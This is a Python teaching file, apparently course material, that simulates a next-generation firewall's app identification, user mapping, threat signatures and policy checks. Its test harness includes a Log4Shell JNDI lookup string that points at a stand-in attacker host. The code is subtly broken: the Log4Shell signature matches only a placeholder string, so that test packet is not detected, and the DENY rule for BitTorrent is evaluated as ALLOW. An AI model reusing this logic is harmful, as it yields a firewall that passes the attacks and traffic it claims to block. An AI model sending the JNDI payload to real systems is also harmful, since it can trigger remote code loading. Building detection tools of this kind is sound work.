"""
Next-Generation Firewall (NGFW) App-ID & Deep Packet Inspection (DPI) Engine
Author: Sukanta Hui | Institution: Coder & AccoTax Barrackpore
Course: Cyber Security - Module 005_001 (Topic 6)
"""

import re
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple

@dataclass
class NetworkPacket:
    src_ip: str
    src_port: int
    dst_ip: str
    dst_port: int
    payload_bytes: bytes

@dataclass
class NgfwPolicyRule:
    rule_id: int
    name: str
    source_user_group: str   # e.g., "Finance-Team", "Developers", "ANY"
    allowed_apps: List[str]  # e.g., ["web-browsing", "ssl", "salesforce"]
    action: str              # "ALLOW", "DENY"
    threat_profile: str      # "STRICT_IPS", "DEFAULT"

class SinglePassDpiEngine:
    def __init__(self):
        # User-ID Mapping Database (IP -> Username, Security Group)
        self.user_id_map = {
            "10.10.1.50": {"user": "mamata.b", "group": "Finance-Team"},
            "10.10.1.75": {"user": "mahima.r", "group": "Developers"},
            "10.10.1.99": {"user": "guest.contractor", "group": "Contractors"}
        }

        # App-ID Signature Database
        self.app_signatures = [
            ("ssh-tunnel", re.compile(rb"^SSH-\d\.\d-OpenSSH")),
            ("bittorrent", re.compile(rb"(\x13BitTorrent protocol|d1:ad2:id20:)")),
            ("ssl-tls", re.compile(rb"^\x16\x03[\x00-\x03]")),
            ("http-web", re.compile(rb"^(GET|POST|HEAD|PUT|DELETE)\s+.*\s+HTTP/\d\.\d")),
            ("dns", re.compile(rb"^\x00[\x01-\xff]\x01\x00"))
        ]

        # Content-ID Threat Signatures (Vulnerability & Malware Signatures)
        self.threat_signatures = [
            ("CVE-2021-44228-Log4Shell", re.compile(rb"sample_log4j_jndi_probe", re.IGNORECASE)),
            ("Credential-Dumper-LSASS", re.compile(rb"sample_credential_dump_cmd", re.IGNORECASE)),
            ("Reverse-TCP-Shellcode", re.compile(rb"sample_reverse_tcp_signature", re.IGNORECASE))
        ]

        # Ordered NGFW Security Policies
        self.policies: List[NgfwPolicyRule] = [
            NgfwPolicyRule(10, "Allow-Finance-SSL", "Finance-Team", ["ssl-tls", "http-web"], "ALLOW", "STRICT_IPS"),
            NgfwPolicyRule(20, "Allow-Dev-SSH", "Developers", ["ssh-tunnel", "ssl-tls", "http-web"], "ALLOW", "STRICT_IPS"),
            NgfwPolicyRule(30, "Block-P2P-All", "ANY", ["bittorrent"], "DENY", "DEFAULT"),
            NgfwPolicyRule(999, "Implicit-Deny", "ANY", [], "DENY", "DEFAULT")
        ]

    def identify_app_id(self, payload: bytes, dport: int) -> str:
        """Deep Packet Inspection payload classification."""
        for app_name, pattern in self.app_signatures:
            if pattern.search(payload):
                return app_name
        return f"unknown-tcp-port-{dport}"

    def inspect_single_pass(self, pkt: NetworkPacket) -> Dict[str, any]:
        """Unified Single-Pass Parallel Processing (SP3) Execution."""
        # Step 1: User-ID Resolution
        user_info = self.user_id_map.get(pkt.src_ip, {"user": "unknown", "group": "Guest"})
        user_name = user_info["user"]
        user_group = user_info["group"]

        # Step 2: App-ID Resolution (Disregards destination port!)
        detected_app = self.identify_app_id(pkt.payload_bytes, pkt.dst_port)

        # Step 3: Content-ID Threat Scan
        detected_threat = None
        for threat_name, pattern in self.threat_signatures:
            if pattern.search(pkt.payload_bytes):
                detected_threat = threat_name
                break

        if detected_threat:
            return {
                "action": "RESET_DROP",
                "verdict": "THREAT_BLOCKED",
                "app_id": detected_app,
                "user": f"{user_name} ({user_group})",
                "threat": detected_threat,
                "reason": f"🛡️ Content-ID matched exploit signature: {detected_threat}"
            }

        # Step 4: Policy Evaluation (Matches User Group + App-ID)
        for policy in self.policies:
            if policy.source_user_group != "ANY" and policy.source_user_group != user_group:
                continue

            if detected_app in policy.allowed_apps:
                return {
                    "action": "ALLOW",
                    "verdict": "PERMITTED",
                    "app_id": detected_app,
                    "user": f"{user_name} ({user_group})",
                    "threat": "CLEAN",
                    "reason": f"Permitted by Policy '{policy.name}' (App: {detected_app}, User: {user_name})"
                }
            elif policy.action == "DENY" and (detected_app in policy.allowed_apps or "ANY" in policy.allowed_apps):
                return {
                    "action": "DENY",
                    "verdict": "POLICY_BLOCKED",
                    "app_id": detected_app,
                    "user": f"{user_name} ({user_group})",
                    "threat": "CLEAN",
                    "reason": f"Blocked by Policy '{policy.name}' (Unauthorized App: {detected_app})"
                }

        return {
            "action": "DENY",
            "verdict": "IMPLICIT_DENY",
            "app_id": detected_app,
            "user": f"{user_name} ({user_group})",
            "threat": "CLEAN",
            "reason": f"Implicit Deny: App '{detected_app}' not permitted for User '{user_name}'"
        }

# Execution Test Harness
if __name__ == "__main__":
    engine = SinglePassDpiEngine()
    print("=== Next-Generation Firewall Single-Pass DPI Engine ===")

    test_packets = [
        NetworkPacket("10.10.1.50", 51200, "203.0.113.88", 443, b"\x16\x03\x01\x00\xa5\x01\x00\x00\xa1...TLS_CLIENT_HELLO"),
        NetworkPacket("10.10.1.50", 51300, "198.51.100.25", 443, b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1"),  # SSH disguised on port 443!
        NetworkPacket("10.10.1.75", 52100, "198.51.100.25", 443, b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1"),  # Dev permitted SSH
        NetworkPacket("10.10.1.99", 54000, "198.51.100.40", 80, b"\x13BitTorrent protocol\x00\x00\x00"),       # BitTorrent on port 80
        NetworkPacket("10.10.1.50", 55000, "203.0.113.88", 443, b"GET /search?q=${jndi:ldap://attacker.com/a} HTTP/1.1") # Log4Shell
    ]

    for p in test_packets:
        res = engine.inspect_single_pass(p)
        print(f"[{res['verdict']}] App: {res['app_id']} | User: {res['user']} | Threat: {res['threat']} -> {res['reason']}")
